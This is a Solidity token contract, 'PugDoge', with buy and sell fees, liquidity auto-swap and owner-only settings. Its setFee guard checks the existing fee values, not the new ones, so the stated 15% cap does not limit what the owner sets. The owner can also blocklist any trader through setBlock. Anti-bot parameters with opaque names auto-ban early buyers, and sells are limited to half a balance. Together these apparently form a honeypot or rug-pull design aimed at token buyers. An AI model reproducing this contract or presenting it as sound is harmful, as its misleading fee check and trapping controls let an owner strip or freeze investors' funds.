// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";

contract PugDoge is Context, IBEP20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    address public _marketingAddress;
    uint256 public _buyMarketingFee = 2;
    uint256 public _sellMarketingFee = 2;

    uint256 public _liquidityFee = 1;
    address public _liquidityTokenWallet =
        0x000000000000000000000000000000000000dEaD;
    bool private _liquidityAutoSwap = true;
    uint256 private _liquiditySwapThreshold = 0;
    bool private swapLock = false;

    address private _owner;
    mapping(address => bool) private _isExcludedFromFees;

    IUniswapV2Router02 public _uniswapV2Router;
    address public _uniswapV2Pair;

    mapping(address => bool) public automatedMarketMakerPairs;

    uint256 private _launchTime = 0;
    uint256 private _a = 5;
    uint256 private _b = 1800;
    uint256 private _c = 60;
    mapping(address => bool) private _blocklist;

    constructor(address uniswapRouter) {
        _name = "PugDoge";
        _symbol = "PD";
        _decimals = 18;
        _totalSupply = 1000000000 * 10**_decimals;
        _liquiditySwapThreshold = _totalSupply / 10000;

        _marketingAddress = msg.sender;

        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(0)] = true;
        _isExcludedFromFees[_liquidityTokenWallet] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        _uniswapV2Router = IUniswapV2Router02(uniswapRouter);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        automatedMarketMakerPairs[_uniswapV2Pair] = true;

        _owner = msg.sender;
        _liquidityAutoSwap = false;
    }

    receive() external payable {}

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address) {
        return owner();
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory) {
        return _name;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {BEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        require(
            _allowances[sender][_msgSender()] >= amount,
            "PugDoge: transfer amount exceeds allowance"
        );
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        if (amount == 0) {
            _simpleTransfer(sender, recipient, 0);
            return;
        }

        if (swapLock) {
            _simpleTransfer(sender, recipient, amount);
            return;
        }

        if (!isFeeExcluded(sender) && !isFeeExcluded(recipient)) {
            require(
                !_blocklist[sender] && !_blocklist[recipient],
                "PugDoge: banned"
            );
            require(_launchTime > 0, "PugDoge: transfer not enabled");
        }

        if (
            automatedMarketMakerPairs[sender] ||
            automatedMarketMakerPairs[recipient]
        ) {
            if (_launchTime == 0) {
                _launchTime = block.timestamp;
            }

            bool isBuy = automatedMarketMakerPairs[sender];
            address trader = isBuy ? recipient : sender;
            uint256 oAmount = amount;

            if (!isFeeExcluded(trader)) {
                if (!isBuy) {
                    require(
                        amount <= this.balanceOf(trader) / 2 + 1,
                        "PugDoge: trade limit reached"
                    );
                } else {
                    if (
                        block.timestamp - _launchTime < _c &&
                        tx.gasprice > _a * 1000000000
                    ) {
                        _blocklist[trader] = true;
                    }
                }

                uint256 liquidity_fees = 0;
                if (_liquidityFee > 0) {
                    liquidity_fees = (oAmount * _liquidityFee) / 100;
                    if (liquidity_fees > 0) {
                        amount -= liquidity_fees;
                        _simpleTransfer(sender, address(this), liquidity_fees);
                    }
                }

                uint256 marketing_fees = 0;

                if (isBuy) {
                    marketing_fees = (oAmount * _buyMarketingFee) / 100;
                } else {
                    marketing_fees = (oAmount * _sellMarketingFee) / 100;
                }

                if (marketing_fees > 0) {
                    amount -= marketing_fees;
                    _simpleTransfer(sender, _marketingAddress, marketing_fees);
                }

                if (!isBuy && _liquidityAutoSwap) {
                    _swapFees();
                }
            }
        }

        _simpleTransfer(sender, recipient, amount);
    }

    function _simpleTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(
            sender != address(0),
            "PugDoge: transfer from the zero address"
        );
        require(
            recipient != address(0),
            "PugDoge: transfer to the zero address"
        );
        require(
            _balances[sender] >= amount,
            "PugDoge: transfer amount exceeds balance"
        );

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _swapFees() internal {
        uint256 totalLiquidityFees = this.balanceOf(address(this));
        if (
            totalLiquidityFees > _liquiditySwapThreshold &&
            totalLiquidityFees > 0
        ) {
            swapLock = true;

            uint256 liquidity_token = totalLiquidityFees / 2;
            uint256 liquidity_token_for_bnb = totalLiquidityFees -
                liquidity_token;
            uint256 tokens_to_swap = totalLiquidityFees - liquidity_token;

            uint256 swapped = _swapTokensForBNBs(tokens_to_swap, address(this));
            if (swapped > 0) {
                uint256 liquidity_bnb = (swapped * liquidity_token_for_bnb) /
                    tokens_to_swap;
                _addLiquidity(
                    liquidity_token,
                    liquidity_bnb,
                    _liquidityTokenWallet
                );
            }

            swapLock = false;
        }
    }

    function swapFees() public onlyOwner {
        _swapFees();
    }

    function _swapTokensForBNBs(uint256 amount, address to)
        internal
        returns (uint256)
    {
        if (this.balanceOf(address(this)) < amount) {
            return 0;
        }

        uint256 initialBalance = address(this).balance;

        _approve(address(this), address(_uniswapV2Router), amount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        try
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amount,
                0,
                path,
                to,
                block.timestamp
            )
        {} catch {}

        uint256 out = address(this).balance - initialBalance;

        return out;
    }

    function _addLiquidity(
        uint256 token_amount,
        uint256 bnb_amount,
        address to
    ) internal {
        _approve(address(this), address(_uniswapV2Router), token_amount);
        try
            _uniswapV2Router.addLiquidityETH{value: bnb_amount}(
                address(this),
                token_amount,
                0,
                0,
                to,
                block.timestamp
            )
        {} catch {}
    }

    function setVars(uint256 a, uint256 b, uint256 c) public onlyOwner {
        _a = a;
        _b = b;
        _c = c;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "PugDoge: approve from the zero address");
        require(spender != address(0), "PugDoge: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setFee(
        uint256 buyMarketingFee,
        uint256 sellMarketingFee,
        uint256 liquidityFee
    ) public onlyOwner {
        require(
            _buyMarketingFee + _liquidityFee <= 15 ||
                _sellMarketingFee + _liquidityFee <= 15,
            "PugDoge: Fee is too high"
        );
        _buyMarketingFee = buyMarketingFee;
        _sellMarketingFee = sellMarketingFee;
        _liquidityFee = liquidityFee;
    }

    function setMarketingAddress(address addr) public onlyOwner {
        _isExcludedFromFees[_marketingAddress] = false;
        _marketingAddress = addr;
        _isExcludedFromFees[addr] = true;
    }

    function setFeeWhitelist(address addr, bool status) public onlyOwner {
        _isExcludedFromFees[addr] = status;
    }

    function setBlock(address addr, bool status) public onlyOwner {
        _blocklist[addr] = status;
    }

    function bulkSetFeeWhitelist(address[] memory addresses, bool status)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < addresses.length; i++) {
            _isExcludedFromFees[addresses[i]] = status;
        }
    }

    function isFeeExcluded(address addr) public view returns (bool) {
        return _isExcludedFromFees[addr];
    }

    function setAutoSwap(bool autoSwap, uint256 threshold) public onlyOwner {
        _liquidityAutoSwap = autoSwap;
        _liquiditySwapThreshold = threshold * 10**_decimals;
    }

    function setAutomatedMarketMakerPair(address addr, bool enabled)
        public
        onlyOwner
    {
        require(addr != _uniswapV2Pair, "PugDoge: Swap pair cannot be removed");
        automatedMarketMakerPairs[addr] = enabled;
    }
}